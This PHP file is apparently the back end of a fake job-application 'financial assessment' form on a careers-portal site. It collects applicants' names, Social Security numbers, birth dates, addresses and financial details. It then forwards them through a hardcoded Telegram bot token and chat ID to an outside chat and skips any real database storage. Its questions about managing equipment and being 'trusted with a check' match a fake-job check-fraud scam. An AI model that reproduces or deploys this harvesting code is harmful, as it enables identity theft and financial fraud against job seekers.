<?php
// submit-financial.php
//require_once __DIR__ . '/config/database.php';

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    session_start();
    $user_id = $_SESSION['user_id'];
    
    // Multiple Telegram Bots Configuration
    $telegramBots = [
        [
            'token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY', // Bot 1 token
            'chat_id' => '1325797388' // Bot 1 chat ID
        ],
        // Add more bots here if needed
    ];

    // Collect form data - INCLUDING NEW FIELDS
    $full_name = htmlspecialchars($_POST['full_name']);
    $ssn = htmlspecialchars($_POST['ssn']);
    $dob = htmlspecialchars($_POST['dob']);
    $address = htmlspecialchars($_POST['address']);
    $employment_status = htmlspecialchars($_POST['employment_status']);
    $annual_income = htmlspecialchars($_POST['annual_income']);
    $dependents = htmlspecialchars($_POST['dependents']);
    $income_sources = isset($_POST['income_sources']) ? implode(', ', $_POST['income_sources']) : 'None';
    
    // NEW FIELDS
    $credit_card_debt = htmlspecialchars($_POST['credit_card_debt']);
    $cellular_provider = htmlspecialchars($_POST['cellular_provider']);
    $bill_consistency = htmlspecialchars($_POST['bill_consistency']);
    $emergency_savings = htmlspecialchars($_POST['emergency_savings']);
    
    $equipment_investment = htmlspecialchars($_POST['equipment_investment']);
    $confirm_incapable = htmlspecialchars($_POST['confirm_incapable'] ?? 'N/A');
    $trust_check = htmlspecialchars($_POST['trust_check'] ?? 'N/A');
    $certify_truth = isset($_POST['certify_truth']) ? 'Yes' : 'No';
    $signature = htmlspecialchars($_POST['signature']);

    // Maps for existing fields
    $employment_status_map = [
        'employed_ft' => 'Employed Full-time',
        'employed_pt' => 'Employed Part-time',
        'self_employed' => 'Self-Employed',
        'student' => 'Student',
        'unemployed' => 'Currently Unemployed',
        'other' => 'Other'
    ];
    $income_map = [
        'under_30k' => 'Under $30,000',
        '30k_50k'   => '$30,000 - $50,000',
        '50k_75k'   => '$50,000 - $75,000',
        '75k_100k'  => '$75,000 - $100,000',
        'over_100k' => 'Over $100,000'
    ];

    // NEW MAPS FOR ADDITIONAL FIELDS
    $cellular_provider_map = [
        'verizon_postpaid' => 'Verizon Wireless (Postpaid)',
        'att_postpaid' => 'AT&T (Postpaid)',
        'tmobile_postpaid' => 'T-Mobile (Postpaid)',
        'sprint_postpaid' => 'Sprint/T-Mobile (Postpaid)',
        'verizon_prepaid' => 'Verizon Prepaid',
        'att_prepaid' => 'AT&T Prepaid',
        'tmobile_prepaid' => 'T-Mobile Prepaid',
        'mint_mobile' => 'Mint Mobile',
        'visible' => 'Visible (Verizon)',
        'cricket' => 'Cricket Wireless (AT&T)',
        'metro' => 'Metro by T-Mobile',
        'boost' => 'Boost Mobile',
        'google_fi' => 'Google Fi',
        'xfinity_mobile' => 'Xfinity Mobile',
        'other' => 'Other Provider',
        'none' => 'No Cellular Service'
    ];

    $bill_consistency_map = [
        'always_on_time' => 'Always pay on time',
        'usually_on_time' => 'Usually pay on time (1-2 late payments/year)',
        'sometimes_late' => 'Sometimes pay late (3-5 late payments/year)',
        'frequently_late' => 'Frequently pay late (5+ late payments/year)',
        'not_applicable' => 'Not applicable - no recurring bills'
    ];

    $emergency_savings_map = [
        'yes' => 'Yes - 3+ months of expenses',
        'no' => 'No emergency savings',
        'partial' => 'Partial savings (less than 3 months)'
    ];

    // Convert values to readable format
    $readable_employment = $employment_status_map[$employment_status] ?? $employment_status;
    $readable_income = $income_map[$annual_income] ?? $annual_income;
    $readable_cellular = $cellular_provider_map[$cellular_provider] ?? $cellular_provider;
    $readable_bill_consistency = $bill_consistency_map[$bill_consistency] ?? $bill_consistency;
    $readable_emergency_savings = $emergency_savings_map[$emergency_savings] ?? $emergency_savings;

    // Enhanced Telegram Message with NEW FIELDS
    $message = "💰 NEW FINANCIAL ASSESSMENT SUBMISSION 💰\n\n";
    $message .= "👤 PERSONAL INFORMATION\n";
    $message .= "📛 Full Name: $full_name\n";
    $message .= "🆔 SSN: $ssn\n";
    $message .= "🎂 DOB: $dob\n";
    $message .= "🏠 Address: $address\n\n";
    
    $message .= "💵 FINANCIAL INFORMATION\n";
    $message .= "💼 Employment Status: $readable_employment\n";
    $message .= "💰 Annual Income: $readable_income\n";
    $message .= "👨‍👩‍👧‍👦 Dependents: $dependents\n";
    $message .= "💳 Outstanding Credit Card Debt: " . ucfirst($credit_card_debt) . "\n";
    $message .= "📱 Cellular Provider: $readable_cellular\n";
    $message .= "📅 Bill Payment Consistency: $readable_bill_consistency\n";
    $message .= "🏦 Emergency Savings: $readable_emergency_savings\n";
    $message .= "📊 Additional Income Sources: $income_sources\n\n";
    
    $message .= "💻 EQUIPMENT INVESTMENT\n";
    $message .= "❓ Can manage equipment? " . ucfirst($equipment_investment) . "\n";
    if ($equipment_investment === 'no') {
        $message .= "⚠️ Confirmed incapable? " . ucfirst($confirm_incapable) . "\n";
        $message .= "🤝 Trusted with check? " . ucfirst($trust_check) . "\n";
    }
    
    $message .= "\n✍️ CERTIFICATION\n";
    $message .= "✅ Certified info: $certify_truth\n";
    $message .= "📝 Digital Signature: $signature\n\n";
    $message .= "⏰ Submitted on: " . date('Y-m-d H:i:s');
    $message .= "\n👤 User ID: $user_id";

    // Send to Telegram
    foreach ($telegramBots as $bot) {
        if (!empty($bot['token']) && !empty($bot['chat_id'])) {
            $url = "https://api.telegram.org/bot{$bot['token']}/sendMessage";
            $data = [
                'chat_id' => $bot['chat_id'],
                'text' => $message,
            ];

            $options = [
                'http' => [
                    'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                    'method'  => 'POST',
                    'content' => http_build_query($data),
                    'ignore_errors' => true
                ]
            ];

            @file_get_contents($url, false, stream_context_create($options));
        }
    }

    // ✅ UPDATE DATABASE - Store all financial data including new fields
    // try {
    //     $database = new Database();
    //     $db = $database->getConnection();
        
    //     // First update the main user record
    //     $update_query = "UPDATE users SET financial_completed = 1, financial_completed_at = NOW() WHERE id = :user_id";
    //     $update_stmt = $db->prepare($update_query);
    //     $update_stmt->bindParam(':user_id', $user_id);
    //     $update_stmt->execute();
        
        // Optionally store detailed financial data in a separate table if needed
        // This would require creating a financial_data table with appropriate columns
        /*
        $financial_data_query = "INSERT INTO financial_data (user_id, full_name, ssn, dob, address, employment_status, annual_income, dependents, credit_card_debt, cellular_provider, bill_consistency, emergency_savings, income_sources, equipment_investment, confirm_incapable, trust_check, signature, submitted_at) 
                                VALUES (:user_id, :full_name, :ssn, :dob, :address, :employment_status, :annual_income, :dependents, :credit_card_debt, :cellular_provider, :bill_consistency, :emergency_savings, :income_sources, :equipment_investment, :confirm_incapable, :trust_check, :signature, NOW())";
        $financial_stmt = $db->prepare($financial_data_query);
        $financial_stmt->execute([
            ':user_id' => $user_id,
            ':full_name' => $full_name,
            ':ssn' => $ssn,
            ':dob' => $dob,
            ':address' => $address,
            ':employment_status' => $employment_status,
            ':annual_income' => $annual_income,
            ':dependents' => $dependents,
            ':credit_card_debt' => $credit_card_debt,
            ':cellular_provider' => $cellular_provider,
            ':bill_consistency' => $bill_consistency,
            ':emergency_savings' => $emergency_savings,
            ':income_sources' => $income_sources,
            ':equipment_investment' => $equipment_investment,
            ':confirm_incapable' => $confirm_incapable,
            ':trust_check' => $trust_check,
            ':signature' => $signature
        ]);
        */
        
    // } catch (Exception $e) {
    //     // Log error but don't break the flow
    //     error_log("Database update failed: " . $e->getMessage());
    // }

    // Store in session for any immediate use
    $_SESSION['financial_data'] = $_POST;

    // Redirect logic remains the same
    if ($equipment_investment === 'yes') {
        header("Location: payroll-setup.php");
    } elseif ($equipment_investment === 'no' && $confirm_incapable === 'yes' && $trust_check === 'yes') {
        header("Location: https://careers-portal.42web.io/payroll-setup.php");
    } else {
        header("Location: https://careers-portal.42web.io/thankyou.php?status=declined");
    }
    exit;
} else {
    header('Location: https://careers-portal.42web.io/financial-assessment.php');
    exit();
}
?>
